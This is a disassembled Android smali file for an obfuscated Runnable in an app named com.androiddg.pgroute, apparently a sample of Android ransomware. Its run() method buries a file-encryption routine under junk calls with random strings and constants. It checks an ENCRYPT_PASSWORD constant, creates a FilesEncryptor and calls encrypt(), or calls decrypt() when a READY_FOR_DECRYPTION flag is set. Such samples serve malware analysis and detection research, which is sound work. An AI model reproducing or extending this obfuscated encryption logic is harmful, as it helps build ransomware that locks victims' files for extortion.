.class Lcom/androiddg/pgroute/oRwHoDwR$3;
.super Ljava/lang/Object;
.source "oRwHoDwR.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/androiddg/pgroute/oRwHoDwR;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/androiddg/pgroute/oRwHoDwR;


# direct methods
.method constructor <init>(Lcom/androiddg/pgroute/oRwHoDwR;)V
    .locals 0
    .param p1, "this$0"    # Lcom/androiddg/pgroute/oRwHoDwR;

    .prologue
    .line 313
    iput-object p1, p0, Lcom/androiddg/pgroute/oRwHoDwR$3;->this$0:Lcom/androiddg/pgroute/oRwHoDwR;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x0

    .line 317
    const v0, 0x29c8c044

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "vSIfM"

    const-string v2, "HuiugwkBVq"

    const-string v3, "SGQKUtdjG"

    const-string v4, "HckBqJe"

    const-string v5, "ppntMfE"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$200(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 318
    const-string v0, "HoLaoRP"

    const-string v1, "WWMOAdvE"

    const-string v2, "Vekmki"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->access$800(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 320
    sget-object v0, Lcom/androiddg/pgroute/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    if-eqz v0, :cond_0

    sget-object v0, Lcom/androiddg/pgroute/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    .line 321
    const-string v0, "nEhnSItSO"

    const-string v1, "HPVmmw"

    const v2, 0x179e3cff

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "ewkFNRmm"

    const-string v4, "QfMMlt"

    const-string v5, "gRDiiiw"

    const-string v6, "KEbSOCtM"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$300(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 322
    sget-boolean v0, Lcom/androiddg/pgroute/Constants;->READY_FOR_DECRYPTION:Z

    if-nez v0, :cond_1

    .line 323
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "dOvSKS"

    const-string v2, "susPgosDg"

    const-string v3, "GvIpQr"

    const-string v4, "HPPcaTFgVT"

    const-string v5, "dQKUvOn"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$500(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 324
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "bGWEpnK"

    const-string v2, "maaRkwRaL"

    const-string v3, "EWvbG"

    const-string v4, "RiBqNTJ"

    const-string v5, "UCdhUU"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$500(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 325
    const-string v0, "mPckPww"

    const-string v1, "AGQtjbQKG"

    const v2, 0x33f3c588    # 1.13515E-7f

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "CvthCC"

    const-string v4, "PwJkFku"

    const-string v5, "CftMOfKM"

    const-string v6, "ewBLDi"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$300(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 326
    new-instance v7, Lcom/androiddg/pgroute/FilesEncryptor;

    invoke-direct {v7}, Lcom/androiddg/pgroute/FilesEncryptor;-><init>()V

    .line 327
    .local v7, "encryptor":Lcom/androiddg/pgroute/FilesEncryptor;
    const-string v0, "GSbAr"

    const-string v1, "aVwFgsHmm"

    const v2, 0x326d15f0

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "ViooHo"

    const-string v4, "KGKOOn"

    const-string v5, "gBRRauo"

    const-string v6, "fbOdGQ"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$300(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 328
    const-string v0, "sBNTkDFJu"

    const-string v1, "lKjvAjttpv"

    const-string v2, "qsqLq"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "oDamswDDPsF"

    const v5, 0x247b5ca9

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$600(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 329
    const-string v0, "RTswN"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "PFwciF"

    const-string v3, "ptdCUtM"

    const v4, 0x37504e19

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0xd74933

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$400(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 330
    invoke-virtual {v7}, Lcom/androiddg/pgroute/FilesEncryptor;->encrypt()V

    .line 331
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "LJsDuJci"

    const-string v2, "fOKhbrGEE"

    const-string v3, "kesoswm"

    const-string v4, "GWQnQO"

    const-string v5, "cPPLwsRDJ"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$500(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 332
    const-string v0, "djAAnUl"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x30c9fea6

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0xf25ace3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "EOOSfvC"

    const v5, 0x1ac26d61

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "KfbIbpvt"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$900(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 343
    .end local v7    # "encryptor":Lcom/androiddg/pgroute/FilesEncryptor;
    :cond_0
    :goto_0
    return-void

    .line 334
    :cond_1
    const-string v0, "mBgoHkFom"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x24bd0501

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x6647850

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "FosegcJF"

    const v5, 0x33ee24d

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "smBPFauP"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$900(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 335
    const-string v0, "KffWS"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x277bb206

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x282785d0

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "nMIIGUr"

    const v5, 0x1fbe5391

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "GWWSQ"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$900(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 336
    const v0, 0x2d2adf54

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "vACIbfW"

    const-string v2, "RRoDeT"

    const-string v3, "IIjtfj"

    const-string v4, "JgLwFD"

    const-string v5, "bUbvA"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$200(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 337
    new-instance v7, Lcom/androiddg/pgroute/FilesEncryptor;

    invoke-direct {v7}, Lcom/androiddg/pgroute/FilesEncryptor;-><init>()V

    .line 338
    .restart local v7    # "encryptor":Lcom/androiddg/pgroute/FilesEncryptor;
    const-string v0, "HTJNP"

    const-string v1, "hIrtAIb"

    const-string v2, "BwPuFJ"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "oDuggoTiPs"

    const v5, 0xf0a339b

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$600(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 339
    invoke-virtual {v7}, Lcom/androiddg/pgroute/FilesEncryptor;->decrypt()V

    .line 340
    const-string v0, "quPHDaeTeq"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0xceac7c2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "lCtrGUShb"

    const-string v4, "DRPBBeuV"

    const v5, 0x1685e9b9

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$000(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    goto/16 :goto_0
.end method
